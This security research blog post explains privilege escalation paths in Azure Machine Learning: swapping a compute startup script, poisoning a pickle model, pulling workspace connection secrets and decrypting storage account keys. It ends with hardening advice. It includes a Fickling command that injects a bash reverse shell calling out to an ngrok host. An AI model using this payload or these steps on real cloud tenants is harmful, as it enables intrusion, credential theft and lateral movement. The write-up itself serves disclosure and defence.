---
title: "Privilege Escalation in Azure Machine Learning"
date: 2025-03-10 01:00:00 +0300
tags:
  - Azure,Azure Machine Learning,Storage Account,Privilege Escalation,Machine Learning
categories:
  - Azure
---

A few months ago, when browsing through the Azure services list, I stumbled upon Azure Machine Learning. The sheer number of capabilities and complexity of the service got me curious, so I decided it would be interesting to test it for misconfigurations and vulnerabilities. After some trial and error, my research uncovered intriguing findings. In this blog post, I’ll introduce a new privilege escalation technique that can occur in Azure Machine Learning. These findings were also presented at the [BSides Zagreb 2025 conference](https://www.bsideszagreb.com/archive-2025/#4).

## Introduction

Azure Machine Learning is a cloud-based platform designed to accelerate and manage the entire machine learning lifecycle. Once a task is defined, Azure ML enables users to:
- Explore and prepare datasets
- Develop, train, and validate machine learning models
- Deploy models seamlessly
- Monitor and manage models and datasets using MLOps practices

As with any complex system, misconfigurations may create opportunities for privilege escalation. In this article, I will examine how an attacker with limited access could exploit such weaknesses to compromise Azure Machine Learning and pivot to other systems within the organization.

## Let's Go Back to the Basics

To start working with Azure ML, we must first create a workspace. This is accomplished by creating an Azure ML resource in the Azure Portal. Once this resource is created, we can launch the Azure Machine Learning Studio from the portal to manage your machine learning projects.

![workspace_creation]({{site.baseurl}}/assets/images/AZML/workspace_creation.png){:style="display:block; margin-left:auto; margin-right:auto"}

Each time a new workspace is created, several resources are automatically set up in the assigned resource group, including: Key Vault, Storage Account,Azure Container Registry (optional) and Application Insights.

![azml_resources]({{site.baseurl}}/assets/images/AZML/azml_resources.png){:style="display:block; margin-left:auto; margin-right:auto"}

In addition to these resources, Microsoft provides various built-in roles to manage access and permissions within Azure Machine Learning workspaces.  

- **AzureML Data Scientist** role allows users to perform all actions within the workspace, except for creating or deleting compute resources and modifying the workspace itself.  
- **Compute Operator** role grants the ability to create, manage, delete, and access compute resources within the workspace.  
- **Reader** role provides read-only access to view assets and datastore credentials but does not allow the creation or modification of resources.  
- **Contributor** role enables users to view, create, edit, and delete assets. This includes creating experiments, attaching compute clusters, submitting runs, and deploying web services.  
- **Owner** role offers full access, including the ability to view, create, edit, and delete assets, as well as manage role assignments.

These roles are essential for managing permissions and enabling secure collaboration within the workspace. For example, a user assigned the AzureML Data Scientist role can access the workspace, work with notebooks, and use compute instances to run scripts and train models.

### Compute Instance

Depending on the workload and specific requirements, the user can choose from several compute target options:

• Compute Clusters
• Kubernetes Clusters
• Attached Compute
• Compute Instances

The image above shows what a user might see when using a notebook on a compute instance in the workspace.

![notebook]({{site.baseurl}}/assets/images/AZML/notebook.png){:style="display:block; margin-left:auto; margin-right:auto"}

In Azure ML, data scientists can run notebooks using various compute resources. Each user can have a dedicated compute instance, but notebook files are shared across users because all instances mount the same file share. On a compute instance, two main directories are visible: cloudfiles, shared across all instances, and localfiles, which is private to the current machine.

![compute_instance_file_share]({{site.baseurl}}/assets/images/AZML/compute_instance_file_share.png){:style="display:block; margin-left:auto; margin-right:auto"}

**So, where exactly is this shared storage located?**

All files within the workspace, including notebooks, scripts, models, and snapshot logs, are stored in the Storage Account created during the workspace setup. This storage account features a file share that contains all scripts from the notebook page shared between compute instances, as well as blob storage that holds snapshot logs and models.

![storage_account]({{site.baseurl}}/assets/images/AZML/storage_account.png){:style="display:block; margin-left:auto; margin-right:auto"}

In the file sharing, you can locate the Users directory, which contains all the files that can be access from the notebook page. 

![explore_storage]({{site.baseurl}}/assets/images/AZML/explore_storage.png){:style="display:block; margin-left:auto; margin-right:auto"}

![file_share_mount]({{site.baseurl}}/assets/images/AZML/file_share_mount.png){:style="display:block; margin-left:auto; margin-right:auto"}

It's important to point out that File Share relies solely on credential-based authentication.

![storage_credentials]({{site.baseurl}}/assets/images/AZML/storage_credentials.png){:style="display:block; margin-left:auto; margin-right:auto"}

## Privilege Escalation and Lateral Movement

Azure Machine Learning, like other Azure services, has potential privilege escalation paths that attackers with certain permissions could exploit to compromise the service or move laterally to other resources.

### Abusing Azure Storage Account Keys

**The Startup Script Method**

An attacker can escalate privileges by gaining control over the storage within the Azure ML workspace. With access to the storage account, the attacker can manipulate, edit, delete, and create files within the file share where scripts and notebooks are stored. If an attacker compromises a user with sufficient permissions, they can exploit the `Microsoft.Storage/storageAccounts/listKeys/action` permission. This permission allows the retrieval of access keys for storage accounts. As the name implies, the `listKeys` permission grants the ability to list the access keys. Since the storage account typically uses Shared Key authorization by default, obtaining the access keys grants the attacker unrestricted access to all data within the account.

One of the simplest ways to escalate privileges in Azure ML is by tampering with the startup script used to configure compute instances. Administrators often rely on these scripts to automate setup tasks such as installing libraries, setting environment variables, and applying configurations. The script runs each time a compute instance starts, executing from the directory where it was uploaded. For example, if it is placed in `Users/admin`, it will run from `/home/azureuser/cloudfiles/code/Users/admin`, allowing the use of relative paths. An attacker with access to the storage account or its keys could overwrite this script, injecting malicious code to gain persistent access, exfiltrate data, or move laterally within the Azure environment. Since these scripts are often used across multiple instances, compromising one could impact all associated compute targets, making them a prime target for exploitation.

![privilege_escalation_startup]({{site.baseurl}}/assets/images/AZML/privilege_escalation_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}

To exploit this, let’s assume an attacker has compromised a user with sufficient permissions to access the storage account, such as a Storage Account Contributor. Let’s say the attacker takes over a user named Ely. From there, swapping out the startup script is just a matter of replacing one file. By substituting the original script, the attacker ensures that the malicious code executes automatically each time the compute instance starts, granting persistent access and enabling remote control over the instance. This approach effectively compromises the environment, allowing the attacker to escalate privileges, exfiltrate data, or pivot to other resources within the Azure infrastructure.

![ely_startup_script]({{site.baseurl}}/assets/images/AZML/ely_startup_script.png){:style="display:block; margin-left:auto; margin-right:auto"}

The attacker can locate a file named startup.sh, delete it, and replace it with a malicious file of the same name containing a reverse shell. When a compute instance is started or restarted, the attacker can gain a reverse shell on the machine. In this scenario, ngrok is used to expose a listener and establish the reverse shell connection. The attacker can then obtain a managed identity access token and leverage it to pivot to other systems.

![shell_startup]({{site.baseurl}}/assets/images/AZML/shell_startup.png){:style="display:block; margin-left:auto; margin-right:auto"}

**Pickle File Injection: From Storage Account to Azure Container**

A similar attack scenario can be executed using a .pkl file. In this case, if user files are stored in the File Share, jobs and experiments are stored in Blob Storage. As before, we assume an attacker has compromised an user who does not have access to Azure Machine Learning but holds the Storage Account Contributor role. The attacker can identify the model stored in the blob, download it, inject malicious Python code into the model, and re-upload the malicious model back into the storage account. This poses a significant risk because .pkl files are typically neither inspected nor easily readable, they contain pre-trained models. These compromised models can be deployed across various systems, including Flask applications, Azure Virtual Machines, Azure Machine Learning endpoints, Azure App Service, Azure Containers, or even external systems outside the cloud. Moreover, such models are frequently distributed internally within organizations, shared with clients, or exposed in public repositories like GitHub, enabling attackers to spread malicious code across the organization. For the proof of concept, we used Fickling to slip malicious code inside model.pkl. As an example, the compromised model was deployed in an Azure Container via Azure Machine Learning. 

As the first step, we identify the `model.pkl` file within the blob storage that we intend to inject with malicious code.

![storage_pkl]({{site.baseurl}}/assets/images/AZML/storage_pkl.png){:style="display:block; margin-left:auto; margin-right:auto"}

After identifying the file, we download it and inject a reverse shell with [Fickling]("https://github.com/trailofbits/fickling"). We can then overwrite the original `model.pkl` file in the blob with the compromised version containing the injected code. Once re-uploaded, the malicious code will execute whenever the model is deployed.

```bash
fickling --inject '__import__("subprocess").run(["bash", "-c", "bash -i >&/dev/tcp/0.tcp.eu.ngrock.io/122274 0>&1"])' model_original.pkl > model.pkl
```

In this scenario, we assume data scientists decide to deploy the model to an Azure Container.

![container]({{site.baseurl}}/assets/images/AZML/container.png){:style="display:block; margin-left:auto; margin-right:auto"}

The attacker can then proceed to obtain the access token and use it to move laterally to other systems.

![shell_container]({{site.baseurl}}/assets/images/AZML/shell_container.png){:style="display:block; margin-left:auto; margin-right:auto"}

### Harvesting Credentials

Having gained access to an Azure ML workspace, the million-dollar question is: what comes next? In this chapter, I will demonstrate how an attacker who has compromised a vulnerable Azure ML user account can move laterally to other systems by extracting stored credentials. Users with the Azure ML Data Scientist role can retrieve credentials from secrets stored within Azure Machine Learning. These secrets, such as API keys and authentication tokens, are primarily stored in Workspace Connections. This creates a juicy opportunity for attackers. Stored secrets become ripe for harvesting as soon as the right permissions fall into the wrong hands. If an attacker gains control of a user with access to Azure ML, they can leverage these credentials to infiltrate other systems, escalate privileges, and exfiltrate sensitive data. A crucial detail overlooked is that credentials cannot be directly read from Azure Machine Learning Studio, they must be accessed via the API. This limitation can create a false sense of security for system administrators, who may assume that credentials stored in the workspace are protected. However, any user with the necessary permissions can still extract them through the API. Even more concerning, these credentials often provide access to external services such as S3 buckets, API connections, external AWS endpoints, and more. For an attacker, this is a goldmine, offering an easy path to further privilege escalation and lateral movement.  

![connection_01]({{site.baseurl}}/assets/images/AZML/connection_01.png){:style="display:block; margin-left:auto; margin-right:auto"}

![connection_02]({{site.baseurl}}/assets/images/AZML/connection_02.png){:style="display:block; margin-left:auto; margin-right:auto"}

### Unlocking Storage Keys and Managed Identity

Before I finalize this article, there’s another aspect of Azure ML I'd like to discuss. This issue was highlighted in the talk [Breaking ML Services: Finding 0-Days in Azure Machine Learning]("https://youtu.be/-K08hpzevYY?si=t0_nqWzVhgrYy88h"), presented by Nitesh Surana during HITB SECCONF in 2023. If we find ourselves in a situation where the attacker successfully compromises a compute instance. <u>It's important to know that users with access to compute instances can also access the storage account keys</u>. To demonstrate this, let's see how users in Azure ML share files between compute instances. It happens through an agent process named `dismountagent`, which checks and mounts the file share on the compute instance every 102 seconds.

![azml_17]({{site.baseurl}}/assets/images/AZML/dsimountagent.png){:style="display:block; margin-left:auto; margin-right:auto"}

To authenticate to the file share, the agent uses a certificate and a private key, which are stored under `/mnt/batch/task/startup/certs/`. This setup allows the compute instances to access the storage account and share files, making it a potential attack vector for those who gain access to the compute instance.

![cert_key_agent]({{site.baseurl}}/assets/images/AZML/cert_key_agent.png){:style="display:block; margin-left:auto; margin-right:auto"}

![pfx_compute]({{site.baseurl}}/assets/images/AZML/pfx_compute.png){:style="display:block; margin-left:auto; margin-right:auto"}

Once the certificate is exported, we can generate a .pfx file. After that, we can load it into the Burp TLS client certificate. 

![burpsuite]({{site.baseurl}}/assets/images/AZML/burpsuite.png){:style="display:block; margin-left:auto; margin-right:auto"}

This enables us to make requests to the backend and retrieve the AccountKeyJWE, potentially gaining access to sensitive information, such as the storage account keys. We have several methods at our disposal: getworkspace, getworkspacesecrets, and getaadtoken. These methods can be used to retrieve the following:

- **getworkspace**: Information about the workspace.
- **getworkspacesecrets**: The AccountKeyJWE.
- **getaadtoken**: The Managed Identity of the compute instance.

![burp_01]({{site.baseurl}}/assets/images/AZML/burp_01.png){:style="display:block; margin-left:auto; margin-right:auto"}

![burp_02]({{site.baseurl}}/assets/images/AZML/burp_02.png){:style="display:block; margin-left:auto; margin-right:auto"}

![burp_03]({{site.baseurl}}/assets/images/AZML/burp_03.png){:style="display:block; margin-left:auto; margin-right:auto"}

Let’s focus on getworkspacesecrets, which allows us to obtain the AccountKeyJWE. To decrypt the AccountKeyJWE, two additional values are required: 

- AZ_LS_ENCRYPTED_SYMMETRIC_KEY
- AZ_BATCHAI_CLUSTER_PRIVATE_KEY_PEM

These values can be found in the file `/mnt/batch/tasks/startup/wd/dsi/dsimountenv`.

![keys]({{site.baseurl}}/assets/images/AZML/keys.png){:style="display:block; margin-left:auto; margin-right:auto"}

When we export this key, we can use the first key to decrypt the second one. Once decrypted, this key can then be used to decrypt the JWE and retrieve the storage account key.

![key_decryption]({{site.baseurl}}/assets/images/AZML/key_decryption.png){:style="display:block; margin-left:auto; margin-right:auto"}

It is now possible to retrieve the storage account access keys used by Azure Machine Learning, allowing us to access the File Share.

![access_key_01]({{site.baseurl}}/assets/images/AZML/access_key_01.png){:style="display:block; margin-left:auto; margin-right:auto"}

![access_key_02]({{site.baseurl}}/assets/images/AZML/access_key_02.png){:style="display:block; margin-left:auto; margin-right:auto"}

A few weeks before this article, it seems that Microsoft decided to "fix" this issue by removing the encryption key from the environment files. It’s unclear whether this change will fully prevent the retrieval of a storage account access key after the compromise of a compute instance. However, since the file share still needs to be mounted on the compute instances, these instances must retrieve the access key in some way.

### Boosting Security for Azure Machine Learning

The privilege escalation techniques discussed in this bog post exploit built-in functionalities that attackers could misuse to gain elevated permissions within Azure ML. Additionally, attackers may leverage these techniques to move laterally, using Azure ML as a pivot point to escalate privileges in other Azure services. To mitigate these risks, organizations can adopt best practices to optimize security in Azure ML. A simple yet effective measure is to enforce network isolation when creating new workspaces. 

![azml_boost_security27]({{site.baseurl}}/assets/images/AZML/boost_security.png){:style="display:block; margin-left:auto; margin-right:auto"}

Microsoft provides detailed guidance in their documentation on securing Azure Machine Learning environments. Key recommendations include:
- Secure the Workspace: Create a private endpoint for the Azure Machine Learning workspace, connecting it to a VNet via private IP addresses. Public access should only be enabled if absolutely necessary.
- Secure Associated Resources: Use service endpoints or private endpoints to securely connect to resources such as Azure Storage and Azure Key Vault. Service endpoints authenticate the VNet’s identity, while private endpoints assign private IP addresses, effectively integrating these services into the VNet.

In addition, it is crucial to:
- Monitor Cloud Environments for any changes or anomalies.
- Enable Comprehensive Logging to track activities and detect suspicious behavior.
- Rotate Storage Account Access Keys regularly to reduce the risk of unauthorized access.
- Control Data Access Permissions to ensure only authorized clients can access sensitive information.
- Review Jupyter Notebooks Periodically to identify and address potential vulnerabilities.
- Enforce the Principle of Least Privilege by granting users and services only the permissions they need to perform their tasks.

These practices further enhance the security and resilience of your Azure Machine Learning environment.
